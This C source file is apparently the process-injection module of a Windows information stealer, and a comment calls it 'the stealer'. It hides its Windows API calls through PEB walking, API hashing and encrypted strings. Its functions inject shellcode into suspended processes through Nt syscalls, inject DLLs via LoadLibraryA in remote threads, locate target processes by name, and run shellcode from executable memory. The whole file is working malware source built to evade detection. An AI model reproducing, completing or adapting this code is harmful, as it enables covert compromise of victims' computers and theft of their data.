#include "inject.h"
#include "engine.h"
#include "config.h"
#include "peb.h"
#include "export_resolve.h"
#include "hash.h"
#include "enc_strings.h"
#include <string.h>
#include <tlhelp32.h>

#ifdef ENABLE_PROCESS_INJECTION

/* PEB-walk API resolution */
typedef BOOL   (WINAPI *pCreateProcessA)(const char *, char *, void *, void *,
                                          BOOL, DWORD, void *, const char *,
                                          STARTUPINFOA *, PROCESS_INFORMATION *);
typedef LPVOID (WINAPI *pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef LPVOID (WINAPI *pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL   (WINAPI *pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T *);
typedef HANDLE (WINAPI *pCreateRemoteThread)(HANDLE, void *, SIZE_T,
                                              LPTHREAD_START_ROUTINE, LPVOID, DWORD, DWORD *);
typedef HANDLE (WINAPI *pOpenProcess)(DWORD, BOOL, DWORD);
typedef HMODULE(WINAPI *pGetModuleHandleA)(const char *);
typedef FARPROC(WINAPI *pGetProcAddress)(HMODULE, const char *);
typedef HANDLE (WINAPI *pCreateToolhelp32Snapshot)(DWORD, DWORD);
typedef BOOL   (WINAPI *pProcess32FirstW)(HANDLE, LPPROCESSENTRY32W);
typedef BOOL   (WINAPI *pProcess32NextW)(HANDLE, LPPROCESSENTRY32W);
typedef BOOL   (WINAPI *pCloseHandle)(HANDLE);
typedef BOOL   (WINAPI *pTerminateProcess)(HANDLE, UINT);
typedef LPVOID  (WINAPI *pVirtualFree)(LPVOID, SIZE_T, DWORD);
typedef BOOL   (WINAPI *pVirtualFreeEx)(HANDLE, LPVOID, SIZE_T, DWORD);
typedef DWORD  (WINAPI *pResumeThread)(HANDLE);
typedef DWORD  (WINAPI *pWaitForSingleObject)(HANDLE, DWORD);
typedef BOOL   (WINAPI *pGetExitCodeThread)(HANDLE, LPDWORD);

static struct {
    pCreateProcessA        pCPA;
    pVirtualAllocEx        pVAE;
    pVirtualAlloc          pVA;
    pWriteProcessMemory    pWPM;
    pCreateRemoteThread    pCRT;
    pOpenProcess           pOP;
    pGetModuleHandleA      pGMH;
    pGetProcAddress        pGPA;
    pCreateToolhelp32Snapshot pCT32;
    pProcess32FirstW       pP32F;
    pProcess32NextW        pP32N;
    pCloseHandle           pCH;
    pTerminateProcess      pTP;
    pVirtualFree           pVF;
    pVirtualFreeEx         pVFE;
    pResumeThread          pRT;
    pWaitForSingleObject   pWFSO;
    pGetExitCodeThread     pGECT;
    int                    ready;
} inj_api;

static int inj_ensure_api(void) {
    if (inj_api.ready) return 1;
    char dll[32]; char fn[32];
    enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, dll);
    void *k32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
    if (!k32) return 0;
    enc_decrypt(enc_CreateProcessA, ENC_CREATEPROCESSA_LEN, fn);
    inj_api.pCPA = (pCreateProcessA)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_VirtualAllocEx, ENC_VIRTUALALLOCEX_LEN, fn);
    inj_api.pVAE = (pVirtualAllocEx)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    inj_api.pVA = (pVirtualAlloc)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func("VirtualAlloc"));
    enc_decrypt(enc_WriteProcessMemory, ENC_WRITEPROCESSMEMORY_LEN, fn);
    inj_api.pWPM = (pWriteProcessMemory)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_CreateRemoteThread, ENC_CREATEREMOTETHREAD_LEN, fn);
    inj_api.pCRT = (pCreateRemoteThread)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_OpenProcess, ENC_OPENPROCESS_LEN, fn);
    inj_api.pOP = (pOpenProcess)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_GetModuleHandleA, ENC_GETMODULEHANDLEA_LEN, fn);
    inj_api.pGMH = (pGetModuleHandleA)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_GetProcAddress, ENC_GETPROCADDRESS_LEN, fn);
    inj_api.pGPA = (pGetProcAddress)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_CreateToolhelp32Snapshot, ENC_CREATETOOLHELP32SNAPSHOT_LEN, fn);
    inj_api.pCT32 = (pCreateToolhelp32Snapshot)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_Process32FirstW, ENC_PROCESS32FIRSTW_LEN, fn);
    inj_api.pP32F = (pProcess32FirstW)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_Process32NextW, ENC_PROCESS32NEXTW_LEN, fn);
    inj_api.pP32N = (pProcess32NextW)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_CloseHandle, ENC_CLOSEHANDLE_LEN, fn);
    inj_api.pCH = (pCloseHandle)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_TerminateProcess, ENC_TERMINATEPROCESS_LEN, fn);
    inj_api.pTP = (pTerminateProcess)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_VirtualFree, ENC_VIRTUALFREE_LEN, fn);
    inj_api.pVF = (pVirtualFree)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_VirtualFreeEx, ENC_VIRTUALFREEEX_LEN, fn);
    inj_api.pVFE = (pVirtualFreeEx)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_ResumeThread, ENC_RESUMETHREAD_LEN, fn);
    inj_api.pRT = (pResumeThread)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_WaitForSingleObject, ENC_WAITFORSINGLEOBJECT_LEN, fn);
    inj_api.pWFSO = (pWaitForSingleObject)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_GetExitCodeThread, ENC_GETEXITCODETHREAD_LEN, fn);
    inj_api.pGECT = (pGetExitCodeThread)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    if (!inj_api.pCPA || !inj_api.pVAE || !inj_api.pWPM || !inj_api.pCRT ||
        !inj_api.pOP || !inj_api.pGMH || !inj_api.pGPA || !inj_api.pCT32 ||
        !inj_api.pP32F || !inj_api.pP32N || !inj_api.pCH ||
        !inj_api.pTP || !inj_api.pVF || !inj_api.pVFE || !inj_api.pRT ||
        !inj_api.pWFSO || !inj_api.pGECT)
        return 0;
    inj_api.ready = 1;
    return 1;
}

inject_result_t inject_shellcode_to_target(const char *target_exe,
                                            const unsigned char *shellcode,
                                            size_t sc_len)
{
    inject_result_t res = {0};
    if (!target_exe || !shellcode || sc_len == 0) return res;
    if (!inj_ensure_api()) return res;

    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    if (!inj_api.pCPA(NULL, (char*)target_exe, NULL, NULL, FALSE,
                       CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        return res;
    }

    PVOID remote_addr = NULL;
    SIZE_T region_size = sc_len;
    NTSTATUS status = mirage_NtAllocateVirtualMemory(pi.hProcess, &remote_addr,
        0, &region_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (status < 0) {
        remote_addr = inj_api.pVAE(pi.hProcess, NULL, sc_len,
                                    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    }

    if (!remote_addr) {
        inj_api.pTP(pi.hProcess, 1);
        inj_api.pCH(pi.hThread);
        inj_api.pCH(pi.hProcess);
        return res;
    }

    SIZE_T bytes_written = 0;
    status = mirage_NtWriteVirtualMemory(pi.hProcess, remote_addr,
                                          (PVOID)shellcode, sc_len, &bytes_written);

    if (status < 0 || bytes_written != sc_len) {
        if (!inj_api.pWPM(pi.hProcess, remote_addr, shellcode, sc_len, &bytes_written) ||
            bytes_written != sc_len) {
            inj_api.pVFE(pi.hProcess, remote_addr, 0, MEM_RELEASE);
            inj_api.pTP(pi.hProcess, 1);
            inj_api.pCH(pi.hThread);
            inj_api.pCH(pi.hProcess);
            return res;
        }
    }

    HANDLE remote_thread = NULL;
    status = mirage_NtCreateThreadEx(&remote_thread, THREAD_ALL_ACCESS, NULL,
                                      pi.hProcess, remote_addr, NULL, 0,
                                      0, 0, 0, NULL);

    if (status < 0 || !remote_thread) {
        remote_thread = inj_api.pCRT(pi.hProcess, NULL, 0,
                                      (LPTHREAD_START_ROUTINE)remote_addr,
                                      NULL, 0, NULL);
    }

    if (!remote_thread) {
        inj_api.pVFE(pi.hProcess, remote_addr, 0, MEM_RELEASE);
        inj_api.pTP(pi.hProcess, 1);
        inj_api.pCH(pi.hThread);
        inj_api.pCH(pi.hProcess);
        return res;
    }

    inj_api.pRT(pi.hThread);

    /* Fire-and-forget: do not block the stealer on the injected thread. */

    res.success = 1;
    res.target_pid = pi.dwProcessId;
    strncpy(res.target_name, target_exe, sizeof(res.target_name) - 1);

    mirage_NtClose(remote_thread);
    mirage_NtClose(pi.hThread);
    mirage_NtClose(pi.hProcess);

    return res;
}

inject_result_t inject_dll_to_pid(DWORD pid, const char *dll_path)
{
    inject_result_t res = {0};
    if (!pid || !dll_path) return res;
    if (!inj_ensure_api()) return res;

    HANDLE hProcess = inj_api.pOP(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return res;

    size_t path_len = strlen(dll_path) + 1;
    PVOID remote_path = inj_api.pVAE(hProcess, NULL, path_len,
                                      MEM_COMMIT, PAGE_READWRITE);
    if (!remote_path) {
        inj_api.pCH(hProcess);
        return res;
    }

    SIZE_T written = 0;
    if (!inj_api.pWPM(hProcess, remote_path, dll_path, path_len, &written) ||
        written != path_len) {
        inj_api.pVFE(hProcess, remote_path, 0, MEM_RELEASE);
        inj_api.pCH(hProcess);
        return res;
    }

    /* Resolve kernel32 base and LoadLibraryA address via PEB-walk */
    char k32_dll[32];
    enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, k32_dll);
    void *k32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(k32_dll));
    if (!k32) {
        inj_api.pVFE(hProcess, remote_path, 0, MEM_RELEASE);
        inj_api.pCH(hProcess);
        return res;
    }

    char ll_fn[32];
    enc_decrypt(enc_LoadLibraryA, ENC_LOADLIBRARYA_LEN, ll_fn);
    FARPROC loadlib = (FARPROC)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(ll_fn));
    if (!loadlib) {
        inj_api.pVFE(hProcess, remote_path, 0, MEM_RELEASE);
        inj_api.pCH(hProcess);
        return res;
    }

    HANDLE hThread = inj_api.pCRT(hProcess, NULL, 0,
                                   (LPTHREAD_START_ROUTINE)loadlib,
                                   remote_path, 0, NULL);
    if (!hThread) {
        inj_api.pVFE(hProcess, remote_path, 0, MEM_RELEASE);
        inj_api.pCH(hProcess);
        return res;
    }

    inj_api.pWFSO(hThread, INFINITE);

    DWORD exit_code = 0;
    inj_api.pGECT(hThread, &exit_code);

    res.success = (exit_code != 0) ? 1 : 0;
    res.target_pid = pid;

    inj_api.pCH(hThread);
    inj_api.pVFE(hProcess, remote_path, 0, MEM_RELEASE);
    inj_api.pCH(hProcess);

    return res;
}

DWORD inject_find_process(const char *name)
{
    if (!name) return 0;
    if (!inj_ensure_api()) return 0;

    HANDLE snap = inj_api.pCT32(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    /* Convert narrow name to wide for comparison */
    wchar_t wname[MAX_PATH];
    int ni;
    for (ni = 0; name[ni] && ni < MAX_PATH - 1; ni++)
        wname[ni] = (wchar_t)(unsigned char)name[ni];
    wname[ni] = 0;

    PROCESSENTRY32W pe = {0};
    pe.dwSize = sizeof(pe);

    DWORD pid = 0;
    if (inj_api.pP32F(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, wname) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (inj_api.pP32N(snap, &pe));
    }

    inj_api.pCH(snap);
    return pid;
}

int inject_execute_local(const unsigned char *shellcode, size_t sc_len)
{
    if (!shellcode || sc_len == 0) return -1;

    PVOID exec = inj_api.pVA(NULL, sc_len, MEM_COMMIT | MEM_RESERVE,
                               PAGE_EXECUTE_READWRITE);
    if (!exec) return -1;

    memcpy(exec, shellcode, sc_len);

    int (*code)(void) = (int (*)(void))exec;
    int ret = code();

    inj_api.pVF(exec, 0, MEM_RELEASE);
    return ret;
}

#endif /* ENABLE_PROCESS_INJECTION */
